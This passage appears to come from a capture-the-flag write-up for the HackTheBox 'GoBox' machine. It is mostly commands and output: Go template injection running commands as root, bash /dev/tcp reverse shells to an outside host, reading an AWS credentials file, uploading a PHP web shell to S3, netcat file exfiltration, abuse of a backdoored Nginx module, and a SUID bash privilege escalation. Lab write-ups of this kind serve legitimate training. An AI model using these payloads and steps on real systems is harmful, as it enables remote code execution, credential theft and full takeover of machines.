<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">email={{.DebugCmd <span style="color:#f1fa8c">&#34;id &#34;</span>}} outputs: Email Sent To: uid=<span style="color:#bd93f9">0</span>(root) gid=<span style="color:#bd93f9">0</span>(root) groups=<span style="color:#bd93f9">0</span>(root)
</code></pre></td></tr></table>
</div>
</div><p>We can craft a reverse shell with</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">email={{.DebugCmd <span style="color:#f1fa8c">&#34;/usr/bin/bash -c &#39;exec /usr/bin/bash -i &amp;&gt;/dev/tcp/10.10.14.112/11111 &lt;&amp;1&#39;&#34;</span>}}
</code></pre></td></tr></table>
</div>
</div><p>but it hangs :( &hellip; This may be because of some firewall</p>
<h1 id="enumeration">Enumeration</h1>
<p>trying different commands:</p>
<ul>
<li>ifconfig &ndash;&gt; /bin/bash: ifconfig: command not found</li>
<li>ss &ndash;&gt; /bin/bash: ss: command not found</li>
</ul>
<p>We may be in a container &hellip; which the below commands comfirm:</p>
<ul>
<li>hostname &ndash;&gt; aws</li>
<li>/usr/bin/bash &ndash;version &ndash;&gt; version 5.0.17(1)-release</li>
<li>ls -la / &ndash;&gt; -rwxr-xr-x 1 root root 0 Aug 24 19:06 .dockerenv</li>
<li>cat /proc/net/fib_trie | grep 172 &ndash;&gt; docker container</li>
</ul>
<p>Yes we are in a container. We already have clear evidence this is a docker container running on AWS. So there may be some security Group rules preventing to reach my machine from this interface.</p>
<ul>
<li>which aws &ndash;&gt; /usr/bin/aws</li>
<li>aws s3 ls &ndash;&gt; 2021-09-03 05:06:28 website</li>
<li>aws s3 ls website &ndash;&gt; we find the PHP website filesystem exposed on port 80</li>
</ul>
<p>The website that runs on port 80 can without doubt reach our machine, so we can attempt to push a PHP Shell if we have the right aws credentials</p>
<ul>
<li>ls ~/.aws/credentials &ndash;&gt; /root/.aws/credentials</li>
<li>cat ~/.aws/credentials &ndash;&gt;</li>
</ul>
<pre tabindex="0"><code>[default]
aws_access_key_id=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
aws_secret_access_key=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
</code></pre><h1 id="delivery-mechanism">Delivery Mechanism</h1>
<p>with awscli, we have now a delivery mechanism for this shell.php:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#39;&lt;?php echo system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> | base64
<span style="color:#8be9fd;font-style:italic">echo</span> PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4K | base64 -d &gt;&gt; /dev/shm/shell.php
aws s3 cp /dev/shm/reverse.php s3://website/

Completed <span style="color:#bd93f9">35</span> Bytes/35 Bytes <span style="color:#ff79c6">(</span><span style="color:#bd93f9">938</span> Bytes/s<span style="color:#ff79c6">)</span> with <span style="color:#bd93f9">1</span> file<span style="color:#ff79c6">(</span>s<span style="color:#ff79c6">)</span> remaining
upload: ../../dev/shm/shell.php to s3://website/shell.php

Success: http://10.10.11.113/shell.php?cmd<span style="color:#ff79c6">=</span>id
</code></pre></td></tr></table>
</div>
</div><h1 id="reverse-shell">Reverse Shell</h1>
<p><code>http://10.10.11.113/shell.php?cmd=/usr/bin/bash -c 'exec /usr/bin/bash -i %26&gt;/dev/tcp/10.10.14.112/11111 &lt;%261'</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nc -lnvp <span style="color:#bd93f9">11111</span>
Connection from 10.10.11.113:59720
bash: cannot <span style="color:#8be9fd;font-style:italic">set</span> terminal process group <span style="color:#ff79c6">(</span>848<span style="color:#ff79c6">)</span>: Inappropriate ioctl <span style="color:#ff79c6">for</span> device
bash: no job control in this shell
www-data@gobox:/opt/website$ id
id
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>33<span style="color:#ff79c6">(</span>www-data<span style="color:#ff79c6">)</span>
www-data@gobox:/opt/website$ sudo -l
sudo -l
sudo: a terminal is required to <span style="color:#8be9fd;font-style:italic">read</span> the password; either use the -S option to <span style="color:#8be9fd;font-style:italic">read</span> from standard input or configure an askpass helper
</code></pre></td></tr></table>
</div>
</div><h1 id="upgrade-shell">upgrade shell</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">www-data@gobox:/opt/website$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@gobox:/opt/website$ ^Z
<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span> + <span style="color:#bd93f9">17007</span> suspended nc -lnvp <span style="color:#bd93f9">11111</span>

~ took 2m 56s
<span style="color:#ff79c6">[</span>I<span style="color:#ff79c6">]</span> ✦ ➜ stty raw -echo; <span style="color:#8be9fd;font-style:italic">fg</span>
<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span> + <span style="color:#bd93f9">17007</span> continued nc -lnvp <span style="color:#bd93f9">11111</span>
reset
reset: unknown terminal <span style="color:#8be9fd;font-style:italic">type</span> unknown
Terminal type? xterm-256color

www-data@gobox:/opt/website$ ls /home/ubuntu/
user.txt
www-data@gobox:/opt/website$ cat /home/ubuntu/user.txt
d6b916265fd4a984d17db028a3a729f0
</code></pre></td></tr></table>
</div>
</div><h1 id="further-exploration">Further exploration</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">www-data@gobox:/opt/website$ ss -lntp
State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">4096</span> 0.0.0.0:9000 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">4096</span> 0.0.0.0:9001 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">511</span> 0.0.0.0:8080 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">511</span> 0.0.0.0:80 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">4096</span> 127.0.0.53%lo:53 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">511</span> 0.0.0.0:4566 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> 0.0.0.0:22 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">511</span> 127.0.0.1:8000 0.0.0.0:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">4096</span> <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:9000 <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">4096</span> <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:9001 <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:_
LISTEN <span style="color:#bd93f9">0</span> <span style="color:#bd93f9">128</span> <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:22 <span style="color:#ff79c6">[</span>::<span style="color:#ff79c6">]</span>:<span style="color:#f1fa8c">\*</span>
</code></pre></td></tr></table>
</div>
</div><p>let&rsquo;s figure out what is running on what port with <code>cat /etc/nginx/sites-enabled/default</code></p>
<pre tabindex="0"><code>0.0.0.0:4566 ---------auth----&gt; proxy_pass 127.0.0.1:9000
0.0.0.0:8080 (golang) --------&gt; proxy_pass 127.0.0.1:9001
127.0.0.1:8000 ---------------&gt; command on (Refer to modules, see below)
</code></pre><p>It is not clear what we have on port 8000, but we can explore the modules:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">www-data@gobox:/opt/website$ ls /etc/nginx/modules-enabled/<span style="color:#f1fa8c">\*</span>
/etc/nginx/modules-enabled/50-backdoor.conf
/etc/nginx/modules-enabled/50-mod-http-image-filter.conf
/etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf
/etc/nginx/modules-enabled/50-mod-mail.conf
/etc/nginx/modules-enabled/50-mod-stream.conf

cat 50-backdoor.conf
load_module modules/ngx_http_execute_module.so;
</code></pre></td></tr></table>
</div>
</div><p>And we find this Nginx module which enables RCE on port 8000: <a href="https://github.com/limithit/NginxExecute">https://github.com/limithit/NginxExecute</a></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">www-data@gobox:/opt/website$ curl http://127.0.0.1:8000?system.run<span style="color:#ff79c6">[</span>id<span style="color:#ff79c6">]</span>
curl: <span style="color:#ff79c6">(</span>52<span style="color:#ff79c6">)</span> Empty reply from server
</code></pre></td></tr></table>
</div>
</div><p>according to documentation the above should have worked but it failed, so will have to audit the module:</p>
<h1 id="audit-the-backdoor">Audit the backdoor</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">find /lib -name <span style="color:#f1fa8c">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
ls -l /usr/lib/nginx/modules/ngx_http_execute_module.so
-rw-r--r-- <span style="color:#bd93f9">1</span> root root <span style="color:#bd93f9">163896</span> Aug <span style="color:#bd93f9">23</span> 20:59 /usr/lib/nginx/modules/ngx_http_execute_module.so
</code></pre></td></tr></table>
</div>
</div><p>it is readable, hence auditable. I make a local copy:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">remote$ md5sum ngx_http_execute_module.so
15f0ad443a4b4888bfbee4e5b2cf0ae6  ngx_http_execute_module.so
remote$ nc 10.10.14.112 <span style="color:#bd93f9">11112</span> &lt; ngx_http_execute_module.so
local$ nc -lnvp <span style="color:#bd93f9">11112</span> &gt; ngx_http_execute_module.so
local$ md5 ngx_http_execute_module.so
MD5 <span style="color:#ff79c6">(</span>ngx_http_execute_module.so<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">=</span> 15f0ad443a4b4888bfbee4e5b2cf0ae6
</code></pre></td></tr></table>
</div>
</div><p>MD5 are the same so file integrity was preserved during transfer</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">strings ngx_http_execute_module.so | bat
  <span style="color:#bd93f9">81</span>   │ ippsec.run
  <span style="color:#bd93f9">82</span>   │ text/html
  <span style="color:#bd93f9">83</span>   │ <span style="color:#8be9fd;font-style:italic">command</span>
  <span style="color:#bd93f9">84</span>   │ Failed to allocate response buffer.
  <span style="color:#bd93f9">85</span>   │ 8,4,8,0011111111010111001111111111111111
  <span style="color:#bd93f9">86</span>   │ /bin/sh
</code></pre></td></tr></table>
</div>
</div><p>we find ippsec.run which looks like system.run &hellip; coincidental? Nope, it works:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">www-data@gobox:/opt/website$ curl http://127.0.0.1:8000?ippsec.run<span style="color:#ff79c6">[</span>id<span style="color:#ff79c6">]</span>
<span style="color:#8be9fd;font-style:italic">uid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">gid</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">groups</span><span style="color:#ff79c6">=</span>0<span style="color:#ff79c6">(</span>root<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="root-flag">Root flag</h1>
<pre tabindex="0"><code>curl http://127.0.0.1:8000?ippsec.run[ls%20%2froot]
iptables.sh
root.txt
snap
curl http://127.0.0.1:8000?ippsec.run[cat%20%2froot%2froot.txt]
81d35170fb50fe21ed42cbda4a45913e
</code></pre><h1 id="privilege-escalation">privilege escalation</h1>
<p>I encode as url the folowing in Burp: <code>/usr/bin/bash -c 'exec /usr/bin/bash -i &amp;&gt;/dev/tcp/10.10.14.112/11112 &lt;&amp;1; cat'</code>, then I use the encoded version as payload:</p>
<pre tabindex="0"><code>curl http://127.0.0.1:8000?ippsec.run[%2f%75%73%72%2f%62%69%6e%2f%62%61%73%68%20%2d%63%20%27%65%78%65%63%20%2f%75%73%72%2f%62%69%6e%2f%62%61%73%68%20%2d%69%20%26%3e%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%31%31%32%2f%31%31%31%31%32%20%3c%26%31%27]
</code></pre><p>Unfortunately, the shell is destroyed after few seconds</p>
<p>instead we can make a copy of bash, then set SUID. Running it with <code>-p</code> will preserve privileges:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#6272a4"># cp /usr/bin/bash /tmp/</span>
curl http://127.0.0.1:8000?ippsec.run<span style="color:#ff79c6">[</span>cp%20%2fusr%2fbin%2fbash%20%2ftmp%2f<span style="color:#ff79c6">]</span>
<span style="color:#6272a4"># chmod 4777 /tmp/bash</span>
curl http://127.0.0.1:8000?ippsec.run<span style="color:#ff79c6">[</span>chmod%204777%20%2ftmp%2fbash<span style="color:#ff79c6">]</span>
:/usr/lib/nginx/modules$ ls -l /tmp | grep bash
-rwsrwxrwx <span style="color:#bd93f9">1</span> root     root     <span style="color:#bd93f9">1183448</span> Sep  <span style="color:#bd93f9">3</span> 19:27 bash
www-data@gobox:/tmp/bash -p
www-data@gobox:/usr/lib/nginx/modules$ /tmp/bash -p
bash-5.0# id
